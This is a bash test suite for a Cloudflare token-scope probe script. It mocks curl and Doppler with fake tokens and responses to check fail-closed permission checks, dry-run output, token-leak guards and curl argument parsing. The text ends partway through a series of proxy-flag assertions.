#!/usr/bin/env bash
# Test for cf-token-scope.sh — the deterministic three-layer fail-closed
# retained-scope probe (ADR-130 four-probe set + #6755/#6892).
#
# Stubs curl + doppler on PATH via a scratch bin dir; keeps real jq. Asserts:
#   - status layer (403/000/5xx/empty/no-newline/non-numeric = FAIL)
#   - body-shape layer: BOTH halves independently pinned —
#       {"success":true,"result":null}  = FAIL (null result)
#       {"success":false,"result":[]}   = FAIL (success false)
#   - per-scheme control layer (account 404 = FAIL; zone 404 trusted ONLY for the
#     verified phase http_config_settings, and only under an authorized control)
#   - --target-entrypoint: present-not-added, and the success line is gated on the
#     target probe actually passing (a denied/404 target => exit 3, no PASS line)
#   - --dry-run (token unexpanded, private-fd form, curl never run), token never
#     leaked to combined 2>&1, and source grep-guards with a positive anchor.
#
# Accumulate-then-exit style. All greps run against FILES (never a pipe) to avoid
# the pipefail + `grep -q` early-match SIGPIPE flake.
# HYGIENE MODEL (fix-round seats, stated honestly): the suite REQUIRES a bash
# where `VAR=x run …` prefix assignments are transient past the call (bash >=
# 5.2 behavior; not version-gated here — the D-block unsets are belt-and-braces
# for older shells). The C-block's mock specs are set the same prefix way and
# RELY on the assignment reaching the child for the call's duration; no C/D
# assertion relies on persistence beyond the call.
set -uo pipefail

TESTDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SUT="$TESTDIR/../skills/cf-token-scope/scripts/cf-token-scope.sh"
BASHBIN="$(command -v bash)"
JQBIN="$(command -v jq)"

pass=0
fail=0
ok() { pass=$((pass + 1)); printf 'ok   - %s\n' "$1"; }
no() { fail=$((fail + 1)); printf 'FAIL - %s\n' "$1"; }

WORK="$(mktemp -d -t cf-token-scope-test.XXXXXXXX)"
trap 'rm -rf "$WORK"' EXIT
OUTFILE="$WORK/out.txt"

# --- mock bin (curl + doppler + real jq); a second bin omits curl ---
MOCKBIN="$WORK/bin"
NOCURLBIN="$WORK/bin-nocurl"
mkdir -p "$MOCKBIN" "$NOCURLBIN"

cat >"$MOCKBIN/doppler" <<'EOF'
#!/usr/bin/env bash
# doppler secrets get <NAME> -p soleur -c prd_terraform --plain
name="$3"
[[ -n "${MOCK_DOPPLER_MARKER:-}" ]] && printf '%s\n' "$name" >>"$MOCK_DOPPLER_MARKER"
# _NEXT staging keys (migration profiles, --staged) resolve to "<base value>-next"
# unless MOCK_NEXT_MISSING names that key; MOCK_MISSING blanks one base key.
next=""
if [[ "$name" == *_NEXT ]]; then
  [[ "${MOCK_NEXT_MISSING:-}" == "$name" ]] && { printf ''; exit 0; }
  name="${name%_NEXT}"; next="-next"
fi
[[ -n "${MOCK_MISSING:-}" && "${MOCK_MISSING}" == "$name" ]] && { printf ''; exit 0; }
case "$name" in
  CF_API_TOKEN_RULESETS) v="${MOCK_TOKEN-fake-secret-abc123xyz}"; [[ -n "$v" ]] && printf '%s%s' "$v" "$next" ;;
  CF_API_TOKEN)          printf '%s%s' "${MOCK_API_TOKEN-default-token-xyz789}" "$next" ;;
  CF_API_TOKEN_PAGES)    printf '%s%s' "tok-pages-mock" "$next" ;;
  CF_API_TOKEN_ZONE_SETTINGS)  printf '%s%s' "tok-zonesettings-mock" "$next" ;;
  CF_API_TOKEN_BOT_MANAGEMENT) printf '%s%s' "tok-botmgmt-mock" "$next" ;;
  CF_ZONE_ID)            printf '%s' "${MOCK_ZONE-zone0123456789abcdef}" ;;
  CF_ACCOUNT_ID)         printf '%s' "${MOCK_ACCTID-acct9876543210fedcba}" ;;
  *)                     printf '' ;;
esac
EOF

cat >"$MOCKBIN/curl" <<'EOF'
#!/usr/bin/env bash
# Mock curl: emit "<body>\n<code>" to match the SUT's -w '\n%{http_code}'.
# Log positional URL operands and both --url forms across schemes, so an extra
# target cannot hide behind a canonical final argument. A spec of "NONE" emits
# nothing at all (models a total curl failure -> empty response, the no-newline path).
[[ -n "${MOCK_CURL_MARKER:-}" ]] && printf 'called\n' >>"$MOCK_CURL_MARKER"
# %q keeps multi-line arg values (the -w format) on ONE log line: retain the
# original argv before URL parsing shifts the positional parameters below.
[[ -n "${MOCK_CURL_ARGV:-}" ]] && printf '%q ' "$@" >>"$MOCK_CURL_ARGV" && printf '\n' >>"$MOCK_CURL_ARGV"
url=""
method="GET"
body_arg=""
tok=""
record_url() {
  url="$1"
  [[ -n "${MOCK_CURL_URLLOG:-}" ]] && printf '%s\n' "$url" >>"$MOCK_CURL_URLLOG"
}
while [[ $# -gt 0 ]]; do
  case "$1" in
    --url)
      shift
      [[ $# -gt 0 ]] && record_url "$1"
      ;;
    --url=*) record_url "${1#*=}" ;;
    --proxy|--proxy1.0|--preproxy|--socks4|--socks4a|--socks5|--socks5-hostname|-x|-sSx) shift ;;
    --proxy=*|--proxy1.0=*|--preproxy=*|--socks4=*|--socks4a=*|--socks5=*|--socks5-hostname=*|-x*|-sSx*) ;;
    --max-time|-w|--noproxy) shift ;;
    -H)
      shift
      # The SUT passes the bearer as `-H @/dev/fd/N`; read it so the mock can
      # answer per token (the migration profiles' deny/grant pairs).
      if [[ "${1:-}" == @* ]]; then
        hdr="$(cat "${1#@}" 2>/dev/null || true)"
        [[ "$hdr" == "Authorization: Bearer "* ]] && tok="${hdr#Authorization: Bearer }"
      fi
      ;;
    -X) shift; method="${1:-}" ;;
    --data-binary) shift; body_arg="${1:-}" ;;
    --disable|-sS) ;;
    # Any flag this mock does not model is a refusal, never a silent GET: an
    # unmodelled spelling (-XDELETE, -d@file, --data-raw, -K) would otherwise be
    # answered as if it were a read. The suite asserts this log stays empty.
    -*)
      [[ -n "${MOCK_CURL_UNMODELLED:-}" ]] && { printf 'UNMODELLED'; printf ' %q' "$@"; printf '\n'; } >>"$MOCK_CURL_UNMODELLED"
      exit 64
      ;;
    *) record_url "$1" ;;
  esac
  shift
done
# Real CF shapes: a zone .../entrypoint returns a single ruleset OBJECT; the
# account /rulesets list returns an ARRAY. The mock must mirror this so the
# per-scheme body-shape check is exercised against the true contract (#6892 QA).
ZONE_AUTH='200:{"success":true,"result":{"id":"r","kind":"zone","phase":"p","rules":[]}}'
ACCT_AUTH='200:{"success":true,"result":[]}'
# Zone settings list: a real zone always lists settings, so an authorized EMPTY
# list is degraded (the collision guard must never pass on it vacuously).
ZSET_AUTH='200:{"success":true,"result":[{"id":"ssl","value":"full"},{"id":"always_use_https","value":"on"}]}'
# WRITE requests (migration profiles). Logged as "METHOD URL TOKEN BODY". The
# default answer models Cloudflare: a token that holds the URL's scope gets 400
# for the invalid body, any other token 403. MOCK_WRITE_OVERRIDE is a file of
# "<url-regex>|<token>|<code>:<body>" lines; the first match wins.
# Evaluation order: the override, then the zone settings endpoint's JSON-first
# parse, then the token default.
if [[ "$method" != "GET" ]]; then
  [[ -n "${MOCK_WRITE_LOG:-}" ]] && printf '%s %s %s %s\n' "$method" "$url" "$tok" "$body_arg" >>"$MOCK_WRITE_LOG"
  spec=""
  if [[ -n "${MOCK_WRITE_OVERRIDE:-}" && -f "${MOCK_WRITE_OVERRIDE}" ]]; then
    while IFS='|' read -r o_re o_tok o_spec; do
      [[ -n "$o_re" ]] || continue
      if [[ "$url" =~ $o_re && "$tok" == "$o_tok" ]]; then spec="$o_spec"; break; fi
    done <"$MOCK_WRITE_OVERRIDE"
  fi
  # PATCH /zones/<z>/settings parses JSON BEFORE it checks authorization
  # (measured 2026-11-26, #12931 comment 7193905571): a non-JSON body gets 400
  # code 6007 for EVERY token, and valid JSON from a denied token gets 403 code
  # 9109. The grant token's answer to the JSON probe body, 400 code 1006, was
  # measured on 2026-11-26 (#12931 comment 7201789881).
  if [[ -z "$spec" && "$url" =~ /zones/[^/]+/settings$ ]] && ! printf '%s' "$body_arg" | jq -e . >/dev/null 2>&1; then
    spec='400:{"success":false,"errors":[{"code":6007,"message":"Malformed JSON in request body"}]}'
  fi
  if [[ -z "$spec" ]]; then
    base_tok="${tok%-next}"
    granted=0
    case "$base_tok" in
      fake-secret-abc123xyz) [[ "$url" =~ /rulesets/phases/|/rules/lists$ ]] && granted=1 ;;
      default-token-xyz789)  [[ "$url" =~ /dns_records$ ]] && granted=1 ;;
      tok-pages-mock)        [[ "$url" =~ /pages/projects$ ]] && granted=1 ;;
      tok-zonesettings-mock) [[ "$url" =~ /zones/[^/]+/settings$ ]] && granted=1 ;;
      tok-botmgmt-mock)      [[ "$url" =~ /bot_management$ ]] && granted=1 ;;
    esac
    # A granted token's 400, by URL. 1006 (zone settings PATCH) and 10400 (bot
    # management PUT) were measured live on 2026-11-26 (#12931 comment 7201789881).
    # 10026 for the redirects-dns rows was never measured live. The script reads
    # only .errors[0].code, so the message strings are synthetic.
    if [[ "$granted" == 1 ]]; then
      if [[ "$url" =~ /zones/[^/]+/settings$ ]]; then spec='400:{"success":false,"errors":[{"code":1006,"message":"mock: settings grant rejected the probe body"}]}'
      elif [[ "$url" =~ /bot_management$ ]]; then spec='400:{"success":false,"errors":[{"code":10400,"message":"mock: bot management grant rejected the probe body"}]}'
      else spec='400:{"success":false,"errors":[{"code":10026,"message":"invalid json"}]}'; fi
    elif [[ "$url" =~ /zones/[^/]+/settings$ ]]; then spec='403:{"success":false,"errors":[{"code":9109,"message":"Unauthorized to access requested resource"}]}'
    else spec='403:{"success":false,"errors":[{"code":10000,"message":"Authentication error"}]}'; fi
  fi
  printf '%s\n%s' "${spec#*:}" "${spec%%:*}"
  exit 0
fi
[[ -n "${MOCK_GET_LOG:-}" ]] && printf 'GET %s %s\n' "$url" "$tok" >>"$MOCK_GET_LOG"
if [[ "$url" =~ ^https://api\.cloudflare\.com/client/v4/accounts/[^/]+/alerting/v3/policies$ ]]; then
  spec="${MOCK_NOTIF:-$ACCT_AUTH}"
else
case "$url" in
  *http_config_settings*)          spec="${MOCK_CONFIG:-$ZONE_AUTH}" ;;
  *http_request_dynamic_redirect*) spec="${MOCK_DYNREDIR:-$ZONE_AUTH}" ;;
  *http_request_cache_settings*)   spec="${MOCK_CACHE:-$ZONE_AUTH}" ;;
  *http_request_firewall_custom*)  spec="${MOCK_WAF:-$ZONE_AUTH}" ;;
  *http_request_transform*)        spec="${MOCK_TARGET:-$ZONE_AUTH}" ;;
  # default-token profile rows (D-series). Authorized default is the ARRAY shape —
  # every new endpoint returns a list. ORDERING IS LOAD-BEARING: the pools URL is a
  # superstring of the zone-LB match, so pools must precede *load_balancers*.
  *cfd_tunnel*)                    spec="${MOCK_TUNNEL:-$ACCT_AUTH}" ;;
  *access/apps*)                   spec="${MOCK_ACCESS:-$ACCT_AUTH}" ;;
  *dns_records*)                   spec="${MOCK_DNS:-$ACCT_AUTH}" ;;
  # MOCK_ZSET_AFTER_WRITE models a write that landed: once the write log holds a
  # settings write, the settings list answers with it instead.
  */settings)                      spec="${MOCK_ZSET:-$ZSET_AUTH}"
                                   if [[ -n "${MOCK_ZSET_AFTER_WRITE:-}" && -n "${MOCK_WRITE_LOG:-}" ]] && grep -q '/settings ' "$MOCK_WRITE_LOG" 2>/dev/null; then spec="$MOCK_ZSET_AFTER_WRITE"; fi ;;
  *load_balancers/pools*)          spec="${MOCK_LB_POOLS:-$ACCT_AUTH}" ;;
  *load_balancers*)                spec="${MOCK_LB_ZONE:-$ACCT_AUTH}" ;;
  */rulesets)                      spec="${MOCK_ACCT:-$ACCT_AUTH}" ;;
  *)                               spec="${MOCK_OTHER:-$ZONE_AUTH}" ;;
esac
fi
[[ "$spec" == "NONE" ]] && exit 0   # no output at all
code="${spec%%:*}"
body="${spec#*:}"
printf '%s\n%s' "$body" "$code"
EOF

chmod +x "$MOCKBIN/doppler" "$MOCKBIN/curl"
ln -sf "$JQBIN" "$MOCKBIN/jq"
# no-curl bin: doppler + jq only (to exercise the missing-prereq path). Nothing
# external runs before the prereq check, so this bare PATH is sufficient.
cp "$MOCKBIN/doppler" "$NOCURLBIN/doppler"
ln -sf "$JQBIN" "$NOCURLBIN/jq"

# Mock dir FIRST (shadows real curl/doppler), then system bins so the SUT's `cat`
# (usage) and the mock shebangs (/usr/bin/env bash) still resolve.
MOCKPATH="$MOCKBIN:/usr/bin:/bin"
# Every SUT run inherits this: the curl mock appends "UNMODELLED <args>" and exits
# 64 for any flag it does not model. Asserted empty at the end of the suite (U1).
export MOCK_CURL_UNMODELLED="$WORK/curl-unmodelled.log"
: >"$MOCK_CURL_UNMODELLED"

# run <PATH> <args...> ; sets RC and writes combined output to OUTFILE.
run() {
  local path="$1"
  shift
  PATH="$path" "$BASHBIN" "$SUT" "$@" >"$OUTFILE" 2>&1
  RC=$?
}

assert_rc() { if [[ "$RC" == "$1" ]]; then ok "$2"; else no "$2 (want rc=$1 got $RC)"; fi; }
has() { if grep -qF -- "$1" "$OUTFILE"; then ok "$2"; else no "$2 (missing: $1)"; fi; }
lacks() { if grep -qF -- "$1" "$OUTFILE"; then no "$2 (present: $1)"; else ok "$2"; fi; }
# refute / require a literal in the SUT source (grep on a FILE, never a pipe).
src_lacks() { if grep -qE -- "$1" "$SUT"; then no "$2"; else ok "$2"; fi; }
src_has() { if grep -qE -- "$1" "$SUT"; then ok "$2"; else no "$2 (missing anchor: $1)"; fi; }

# --- C1: all authorized + target authorized -> exit 0, "present" line ---
run "$MOCKPATH" --target-entrypoint http_request_transform
assert_rc 0 "C1 all-authorized + target -> exit 0"
has "PASS: no scope dropped" "C1 prints 'no scope dropped'"
has "PASS: target scope present" "C1 prints 'target scope present'"

# --- C2: a retained zone phase (cache) at 403 -> exit 3, no pass line ---
MOCK_CACHE='403:{"success":false,"errors":[{"code":10000}]}' run "$MOCKPATH"
assert_rc 3 "C2 retained phase 403 -> exit 3"
lacks "PASS: no scope dropped" "C2 omits 'no scope dropped'"

# --- C2b: the newly-probed Zone WAF phase at 403 -> exit 3 (drop detected) ---
MOCK_WAF='403:{"success":false}' run "$MOCKPATH"
assert_rc 3 "C2b Zone WAF (firewall_custom) 403 -> exit 3"

# --- C3: degraded 200 {"success":false,"result":null} -> exit 3 ---
MOCK_CACHE='200:{"success":false,"result":null}' run "$MOCKPATH"
assert_rc 3 "C3 degraded 200 (both false) -> exit 3"
lacks "PASS: no scope dropped" "C3 omits 'no scope dropped'"

# --- C3a: {"success":true,"result":null} -> exit 3 (pins the .result-type half;
#          this is the exact fail-open CF degraded shape the SUT exists to catch) ---
MOCK_CACHE='200:{"success":true,"result":null}' run "$MOCKPATH"
assert_rc 3 "C3a degraded 200 (result null, success true) -> exit 3"

# --- C3c: a ZONE entrypoint returning an ARRAY result -> exit 3. Zone entrypoints
#          return a single ruleset OBJECT; an array is the wrong per-scheme shape.
#          (Regression for the #6892 QA bug: the classifier once required an array
#          for ALL probes, which rejected every real authorized zone 200.) ---
MOCK_CACHE='200:{"success":true,"result":[]}' run "$MOCKPATH"
assert_rc 3 "C3c zone 200 with array result (wrong scheme shape) -> exit 3"

# --- C3d: the ACCOUNT list returning an OBJECT result -> exit 3 (account expects
#          an array; the per-scheme type must hold in the account direction too) ---
MOCK_ACCT='200:{"success":true,"result":{"id":"x"}}' run "$MOCKPATH"
assert_rc 3 "C3d account 200 with object result (wrong scheme shape) -> exit 3"

# --- C3b: {"success":false,"result":[]} -> exit 3 (pins the success==true half) ---
MOCK_CACHE='200:{"success":false,"result":[]}' run "$MOCKPATH"
assert_rc 3 "C3b degraded 200 (success false, result array) -> exit 3"

# --- C4: account-scheme 404 -> exit 3 (account list is its own control) ---
MOCK_ACCT='404:{"success":false}' run "$MOCKPATH"
assert_rc 3 "C4 account 404 -> exit 3"

# --- C5a: a 404 on the VERIFIED phase (http_config_settings) under an authorized
#          control -> PASS (ADR-130: 403-on-missing verified there) ---
MOCK_CONFIG='404:{"success":false,"errors":[]}' run "$MOCKPATH"
assert_rc 0 "C5a verified-phase 404 under authorized control -> exit 0"
has "PASS: no scope dropped" "C5a prints 'no scope dropped'"

# --- C5c: a 404 on an UNVERIFIED retained phase (cache) under an authorized
#          control -> FAIL (fail-closed; 403-on-missing unverified there) ---
MOCK_CACHE='404:{"success":false}' run "$MOCKPATH"
assert_rc 3 "C5c unverified-phase 404 under authorized control -> exit 3 (fail-closed)"

# --- C5b: verified-phase 404 while the zone control is degraded -> exit 3 ---
MOCK_CONFIG='404:{"success":false}' MOCK_DYNREDIR='200:{"success":false,"result":null}' run "$MOCKPATH"
assert_rc 3 "C5b verified 404 + degraded control -> exit 3"

# --- C6: status-layer failures ---
MOCK_CONFIG='000:' run "$MOCKPATH"
assert_rc 3 "C6a network 000 -> exit 3"
MOCK_CACHE='500:{}' run "$MOCKPATH"
assert_rc 3 "C6b http 500 -> exit 3"
MOCK_CONFIG='NONE' run "$MOCKPATH"
assert_rc 3 "C6c empty/no-newline response -> exit 3"
MOCK_CONFIG='xyz:{}' run "$MOCKPATH"
assert_rc 3 "C6d non-numeric status code -> exit 3"

# --- C7: negative target — a denied target must exit 3 AND omit the PASS line
#          (the success line is gated on the target probe actually passing) ---
MOCK_TARGET='403:{"success":false}' run "$MOCKPATH" --target-entrypoint http_request_transform
assert_rc 3 "C7 denied target -> exit 3"
lacks "PASS: target scope present" "C7 denied target omits 'target scope present'"

# --- C7a: a target 404 on an UNVERIFIED phase -> exit 3 (cannot confirm the add) ---
MOCK_TARGET='404:{"success":false}' run "$MOCKPATH" --target-entrypoint http_request_transform
assert_rc 3 "C7a unverified target 404 -> exit 3"

# --- C7b: a target 404 on the VERIFIED phase http_config_settings -> exit 0
#          (a fresh widen may leave the phase empty; 404 is trusted there) ---
MOCK_CONFIG='404:{"success":false}' run "$MOCKPATH" --target-entrypoint http_config_settings
assert_rc 0 "C7b verified target 404 -> exit 0"
has "PASS: target scope present (http_config_settings)" "C7b verified target 404 prints present"

# --- C8: --dry-run prints the private-fd recipe with token unexpanded, no curl ---
MARKER="$WORK/curl-called"
MOCK_CURL_MARKER="$MARKER" run "$MOCKPATH" --dry-run
assert_rc 0 "C8 --dry-run -> exit 0"
# shellcheck disable=SC2016  # the literal, unexpanded '$TOK' is exactly the assertion
has '"$TOK"' "C8 dry-run keeps the token var unexpanded"
has "printf 'Authorization: Bearer %s'" "C8 dry-run models the private-fd form, not inline -H"
lacks "fake-secret-abc123xyz" "C8 dry-run leaks no token value"
if [[ ! -e "$MARKER" ]]; then ok "C8 dry-run never invoked curl"; else no "C8 dry-run invoked curl"; fi

# --- C9: a real run never echoes the token value (combined 2>&1) ---
run "$MOCKPATH"
assert_rc 0 "C9 baseline authorized run -> exit 0"
lacks "fake-secret-abc123xyz" "C9 no Bearer token value in combined output"

# --- C10: source grep-guards (negatives enforced) + a positive anchor so the
#          guards cannot pass vacuously on a missing/empty SUT ---
src_has 'set -euo pipefail' "C10 positive anchor present (non-vacuous guards)"
src_lacks 'set +(-x|.*xtrace)' "C10 no shell trace (set -x / xtrace) in source"
src_lacks 'doppler[[:space:]]+(secrets[[:space:]]+)?(set|upload|download|delete)\b' "C10 no Doppler write verb in source"
src_lacks '\bterraform\b' "C10 no 'terraform' in source"

# --- C11: missing Doppler secret -> exit 2 ---
MOCK_TOKEN='' run "$MOCKPATH"
assert_rc 2 "C11 empty token secret -> exit 2"

# --- C12: missing curl prereq -> exit 2 ---
run "$NOCURLBIN"
assert_rc 2 "C12 missing curl binary -> exit 2"

# --- C13: --target-entrypoint with no value -> exit 2 (usage error) ---
run "$MOCKPATH" --target-entrypoint
assert_rc 2 "C13 --target-entrypoint missing value -> exit 2"

# --- C14: --help -> exit 0 ---
run "$MOCKPATH" --help
assert_rc 0 "C14 --help -> exit 0"

# ============================================================================
# D-series — default-token profile (plan 2026-10-28-feat-cf-token-scope-...;
# written RED-first per cq-write-failing-tests-before). C1–C14 above are the
# D13 back-compat pin (run before and after the script phase, unmodified).
# ============================================================================

# stdout-only capture for the channel-sensitive rows (plan addendum 1/16: the
# assert-mode FAIL verdict moved to stdout — same #7797 rationale as the xtrace
# refusal; the merged run() capture cannot pin a channel, this one can).
run_out() {
  local path="$1"
  shift
  PATH="$path" "$BASHBIN" "$SUT" "$@" >"$OUTFILE" 2>"$WORK/err.txt"
  RC=$?
}
has_re() { if grep -qE -- "$1" "$OUTFILE"; then ok "$2"; else no "$2 (no match: $1)"; fi }
has_err() { if grep -qF -- "$1" "$WORK/err.txt"; then ok "$2"; else no "$2 (missing on stderr: $1)"; fi }
lacks_err() { if grep -qF -- "$1" "$WORK/err.txt"; then no "$2 (present on stderr: $1)"; else ok "$2"; fi }
count_f() { grep -cF -- "$1" "$OUTFILE" || true; }
assert_eq() { if [[ "$2" == "$3" ]]; then ok "$1"; else no "$1 (want $2 got $3)"; fi }

SKILLDOC="$TESTDIR/../skills/cf-token-scope/SKILL.md"
PLAYBOOK="$TESTDIR/../skills/cf-token-scope/references/widen-playbook.md"
DOPREQ="$WORK/doppler-requests.log"

# --- D1: default-token dry-run binds CF_API_TOKEN and prints all six rows ---
DM1="$WORK/d1-curl-marker"
MOCK_CURL_MARKER="$DM1" run "$MOCKPATH" --profile default-token --dry-run
assert_rc 0 "D1 default-token dry-run -> exit 0"
has "doppler secrets get CF_API_TOKEN " "D1 dry-run resolves the token secret to CF_API_TOKEN"
for u in cfd_tunnel access/apps dns_records alerting/v3/policies "load_balancers/pools" 'zones/$ZONE/load_balancers'; do
  has "$u" "D1 dry-run prints the $u row"
done
D1_EXPECTED_NOTIF_URL="https://api.cloudflare.com/client/v4/accounts/\$ACCT/alerting/v3/policies"
D1_EXPECTED_NOTIF_RECIPE="curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $D1_EXPECTED_NOTIF_URL"
D1_NOTIF_RECIPE_COUNT=$(grep -Fc -- "$D1_EXPECTED_NOTIF_URL" "$OUTFILE" || true)
if [[ "$D1_NOTIF_RECIPE_COUNT" == "1" ]] && grep -Fxq -- "$D1_EXPECTED_NOTIF_RECIPE" "$OUTFILE"; then
  ok "D1 dry-run prints exactly one Notifications URL with no query or suffix"
else
  no "D1 dry-run Notifications recipe is not the exact documented URL"
fi
src_lacks 'notification_policies' "D1 source no longer contains the legacy Notifications route"
# shellcheck disable=SC2016  # the literal, unexpanded '$TOK' is exactly the assertion
has '"$TOK"' "D1 dry-run keeps the token var unexpanded"
has "printf 'Authorization: Bearer %s'" "D1 dry-run models the private-fd form"
lacks "default-token-xyz789" "D1 dry-run leaks no token value"
if [[ ! -e "$DM1" ]]; then ok "D1 dry-run never invoked curl"; else no "D1 dry-run invoked curl"; fi

# --- D1b: binding pin (Guard 1 M1/M5 detector): this profile must NOT touch the
#          rulesets secret name anywhere. ---
lacks "CF_API_TOKEN_RULESETS" "D1b default-token dry-run never names the rulesets secret"

# --- D1H: Guard 1 H2 (must-PASS, non-canonical): dry-run precedes the prereq
#          loop — the NOCURLBIN PATH (no curl; doppler+jq still present) still
#          exits 0. A suite that only passes with mocks present is over-fitted. ---
run "$NOCURLBIN" --profile default-token --dry-run
assert_rc 0 "D1H default-token dry-run under no-curl PATH -> exit 0 (print/run parity, not mock-overfitted)"

# --- D2: baseline with both LB rows 403 -> exit-neutral not-yet-widened, BOTH
#         rows asserted per-label (Guard 2 M3: no first-member-only pass). ---
D2MARK="$WORK/d2-doppler-requests"
D2URLS="$WORK/d2-curl-urls"
: >"$D2MARK"
LB403='403:{"success":false,"errors":[{"code":10000}]}'
TUNNEL_URL='https://api.cloudflare.com/client/v4/accounts/acct9876543210fedcba/cfd_tunnel?per_page=1'
ACCESS_URL='https://api.cloudflare.com/client/v4/accounts/acct9876543210fedcba/access/apps?per_page=1'
DNS_URL='https://api.cloudflare.com/client/v4/zones/zone0123456789abcdef/dns_records?per_page=1'
NOTIF_URL='https://api.cloudflare.com/client/v4/accounts/acct9876543210fedcba/alerting/v3/policies'
LB_POOLS_URL='https://api.cloudflare.com/client/v4/accounts/acct9876543210fedcba/load_balancers/pools?per_page=1'
LB_ZONE_URL='https://api.cloudflare.com/client/v4/zones/zone0123456789abcdef/load_balancers?per_page=1'
# Directly exercise the mock's negative route boundary; broadening its matcher
# must not let a suffixed path or query receive the Notifications success fixture.
PATH="$MOCKPATH" MOCK_NOTIF='200:{"success":true,"result":[]}' MOCK_OTHER='418:{"success":false}' \
  "$MOCKBIN/curl" "$NOTIF_URL/extra" >"$OUTFILE"
if grep -Fxq -- '418' "$OUTFILE"; then
  ok "D2 mock dispatch rejects a suffixed Notifications URL"
else
  no "D2 mock dispatch accepted a suffixed Notifications URL"
fi
PATH="$MOCKPATH" MOCK_NOTIF='200:{"success":true,"result":[]}' MOCK_OTHER='418:{"success":false}' \
  "$MOCKBIN/curl" "$NOTIF_URL?per_page=1" >"$OUTFILE"
if grep -Fxq -- '418' "$OUTFILE"; then
  ok "D2 mock dispatch rejects a Notifications query suffix"
else
  no "D2 mock dispatch accepted a Notifications query suffix"
fi
D2_OPERAND_LOG="$WORK/d2-curl-operands"
PATH="$MOCKPATH" MOCK_CURL_URLLOG="$D2_OPERAND_LOG" MOCK_NOTIF='200:{"success":true,"result":[]}' \
  "$MOCKBIN/curl" --url=http://example.invalid --url 'ftp://example.invalid/path' "$NOTIF_URL" >"$OUTFILE"
if [[ "$(wc -l < "$D2_OPERAND_LOG" | tr -d '[:space:]')" == "3" ]] \
   && grep -Fxq -- 'http://example.invalid' "$D2_OPERAND_LOG" \
   && grep -Fxq -- 'ftp://example.invalid/path' "$D2_OPERAND_LOG" \
   && grep -Fxq -- "$NOTIF_URL" "$D2_OPERAND_LOG"; then
  ok "D2 mock observer records --url=, --url, and positional targets across schemes"
else
  no "D2 mock observer missed or altered a URL operand"
fi
D2_PROXY_LOG="$WORK/d2-proxy-operand-log"
assert_proxy_only_falls_through() {
  local label="$1"
  shift
  : >"$D2_PROXY_LOG"
  PATH="$MOCKPATH" MOCK_CURL_URLLOG="$D2_PROXY_LOG" MOCK_NOTIF='200:{"success":true,"result":[]}' MOCK_OTHER='418:{"success":false}' \
    "$MOCKBIN/curl" "$@" >"$OUTFILE"
  if [[ ! -s "$D2_PROXY_LOG" ]] && grep -Fxq -- '418' "$OUTFILE"; then
    ok "$label"
  else
    no "$label"
  fi
}
assert_proxy_only_falls_through "D2 --proxy= value is not a transfer URL" "--proxy=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --proxy value is not a transfer URL" --proxy "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --proxy1.0= value is not a transfer URL" "--proxy1.0=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --proxy1.0 value is not a transfer URL" --proxy1.0 "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --preproxy= value is not a transfer URL" "--preproxy=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --preproxy value is not a transfer URL" --preproxy "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --socks4= value is not a transfer URL" "--socks4=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --socks4 value is not a transfer URL" --socks4 "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --socks4a= value is not a transfer URL" "--socks4a=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --socks4a value is not a transfer URL" --socks4a "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --socks5= value is not a transfer URL" "--socks5=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --socks5 value is not a transfer URL" --socks5 "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --socks5-hostname= value is not a transfer URL" "--socks5-hostname=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --socks5-hostname value is not a transfer URL" --socks5-hostname "$NOTIF_URL"
assert_proxy_only_falls_through "D2 -x value is not a transfer URL" -x "$NOTIF_URL"
assert_proxy_only_falls_through "D2 attached -x value is not a transfer URL" "-x$NOTIF_URL"
assert_proxy_only_falls_through "D2 clustered -sSx value is not a transfer URL" -sSx "$NOTIF_URL"
assert_proxy_only_falls_through "D2 attached clustered -sSx value is not a transfer URL" "-sSx$NOTIF_URL"
D2_MIXED_PROXY_LOG="$WORK/d2-proxy-with-transfer-target"
assert_proxy_with_target() {
  local label="$1"
  shift
  : >"$D2_MIXED_PROXY_LOG"
  PATH="$MOCKPATH" MOCK_CURL_URLLOG="$D2_MIXED_PROXY_LOG" MOCK_NOTIF='200:{"success":true,"result":[]}' MOCK_TUNNEL='418:{"success":false}' \
    "$MOCKBIN/curl" "$@" "$TUNNEL_URL" >"$OUTFILE"
  if [[ "$(wc -l < "$D2_MIXED_PROXY_LOG" | tr -d '[:space:]')" == "1" ]] \
     && grep -Fxq -- "$TUNNEL_URL" "$D2_MIXED_PROXY_LOG" \
     && ! grep -Fxq -- "$NOTIF_URL" "$D2_MIXED_PROXY_LOG" \
     && grep -Fxq -- '418' "$OUTFILE"; then
    ok "$label"
  else
    no "$label"
  fi
}
assert_proxy_with_target "D2 --proxy separated beside real target logs only transfer URL" --proxy "$NOTIF_URL"
assert_proxy_with_target "D2 --proxy= beside real target logs only transfer URL" "--proxy=$NOTIF_URL"
assert_proxy_with_target "D2 --proxy1.0 separated beside real target logs only transfer URL" --proxy1.0 "$NOTIF_URL"
assert_proxy_with_target "D2 --proxy1.0= beside real target logs only transfer URL" "--proxy1.0=$NOTIF_URL"
assert_proxy_with_target "D2 --preproxy separated beside real target logs only transfer URL" --preproxy "$NOTIF_URL"
assert_proxy_with_target "D2 --preproxy= beside real target logs only transfer URL" "--preproxy=$NOTIF_URL"
assert_proxy_with_target "D2 --socks4 separated beside real target logs only transfer URL" --socks4 "$NOTIF_URL"
assert_proxy_with_target "D2 --socks4= beside real target logs only transfer URL" "--socks4=$NOTIF_URL"
assert_proxy_with_target "D2 --socks4a separated beside real target logs only transfer URL" --socks4a "$NOTIF_URL"
assert_proxy_with_target "D2 --socks4a= beside real target logs only transfer URL" "--socks4a=$NOTIF_URL"
assert_proxy_with_target "D2 --socks5 separated beside real target logs only transfer URL" --socks5 "$NOTIF_URL"
